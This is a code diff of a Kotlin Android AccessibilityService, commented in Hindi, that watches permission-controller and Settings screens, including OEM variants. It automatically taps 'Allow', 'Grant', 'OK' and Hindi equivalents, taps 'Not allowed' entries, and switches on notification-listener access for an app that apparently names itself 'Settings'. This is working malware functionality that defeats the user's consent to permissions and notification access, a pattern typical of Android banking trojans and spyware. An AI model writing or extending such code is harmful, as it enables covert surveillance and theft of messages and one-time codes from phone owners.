@@ -10,75 +10,117 @@ import android.view.accessibility.AccessibilityNodeInfo
 class AutoPermissionService : AccessibilityService() {
 
     private val handler = Handler(Looper.getMainLooper())
-    private var lastClickTime = 0L
+    private var isProcessing = false
+    private var lastActionTime = 0L
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         val info = AccessibilityServiceInfo().apply {
-            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             notificationTimeout = 200
-            // केवल इन पैकेजों की विंडो देखें (Permission dialogs)
+            // सभी Permission और Settings से जुड़े पैकेज
             packageNames = arrayOf(
                 "com.android.permissioncontroller",
                 "com.google.android.permissioncontroller",
                 "com.android.packageinstaller",
-                "com.android.settings"  // notification listener सेटिंग्स के लिए
+                "com.android.settings",
+                "com.coloros.permissioncontroller",
+                "com.oppo.permissioncontroller",
+                "com.oneplus.permissioncontroller"
             )
         }
         serviceInfo = info
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null || event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+        if (event == null || isProcessing) return
 
-        // एक सेकंड में एक से अधिक क्लिक न हो (तेज़ी से क्लिक रोकने के लिए)
         val now = System.currentTimeMillis()
-        if (now - lastClickTime < 1000) return
-        lastClickTime = now
+        if (now - lastActionTime < 800) return   // बार-बार क्लिक रोकें
 
-        handler.postDelayed({
-            autoClickPermissionButtons()
-            enableNotificationListenerSwitch()
-        }, 500) // थोड़ा रुककर क्लिक करें ताकि विंडो पूरी खुल जाए
+        isProcessing = true
+        lastActionTime = now
+
+        // 600ms बाद प्रोसेस करें ताकि विंडो पूरी लोड हो जाए
+        handler.postDelayed({ processCurrentScreen() }, 600)
     }
 
-    private fun autoClickPermissionButtons() {
-        val root = rootInActiveWindow ?: return
-        val targetTexts = arrayOf("Allow", "ALLOW", "Allow anyway", "OK", "Grant", "Yes", "Enable")
-        for (text in targetTexts) {
+    private fun processCurrentScreen() {
+        val root = rootInActiveWindow
+        if (root == null) {
+            isProcessing = false
+            return
+        }
+
+        // 1. सबसे पहले "Allow" / "Allow anyway" / "अनुमति दें" जैसे बटन खोजें
+        val allowTexts = arrayOf(
+            "Allow", "ALLOW", "Allow anyway",
+            "अनुमति दें", "अनुमति दीजिए", "इजाज़त दें",
+            "OK", "Grant", "Yes", "हाँ", "ठीक है"
+        )
+        if (clickAny(root, *allowTexts)) {
+            isProcessing = false
+            return
+        }
+
+        // 2. फिर "Not allowed" / "अनुमति नहीं है" खोजें और क्लिक करें
+        val notAllowedTexts = arrayOf(
+            "Not allowed", "अनुमति नहीं है", "अनुमति नहीं", "अनुमति नहीं दी",
+            "Not Allowed", "अनुमति नहीं दी गई"
+        )
+        if (clickAny(root, *notAllowedTexts)) {
+            isProcessing = false
+            return
+        }
+
+        // 3. अगर Notification Listener सेटिंग खुली है तो स्विच ऑन करें
+        enableNotificationListenerSwitch(root)
+
+        isProcessing = false
+    }
+
+    /** दिए गए टेक्स्ट में से पहला क्लिक करने योग्य नोड ढूँढ़कर क्लिक करें */
+    private fun clickAny(root: AccessibilityNodeInfo, vararg texts: String): Boolean {
+        for (text in texts) {
             val nodes = root.findAccessibilityNodeInfosByText(text)
             if (nodes != null) {
                 for (node in nodes) {
                     if (node.isClickable) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        return
+                        return true
                     }
                 }
             }
         }
+        return false
     }
 
-    private fun enableNotificationListenerSwitch() {
-        val root = rootInActiveWindow ?: return
+    private fun enableNotificationListenerSwitch(root: AccessibilityNodeInfo) {
         val appName = getString(R.string.app_name) // "Settings"
         val listItems = root.findAccessibilityNodeInfosByText(appName)
         if (listItems != null) {
             for (item in listItems) {
-                val parent = item.parent ?: continue
-                for (i in 0 until parent.childCount) {
-                    val child = parent.getChild(i)
-                    if (child != null &&
-                        "android.widget.Switch" == child.className &&
-                        !child.isChecked
-                    ) {
-                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        return
+                var parent = item.parent
+                while (parent != null) {
+                    for (i in 0 until parent.childCount) {
+                        val child = parent.getChild(i)
+                        if (child != null &&
+                            "android.widget.Switch" == child.className &&
+                            !child.isChecked
+                        ) {
+                            child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            return
+                        }
                     }
+                    parent = parent.parent
                 }
             }
         }
     }
 
-    override fun onInterrupt() {}
+    override fun onInterrupt() {
+        isProcessing = false
+    }
 }
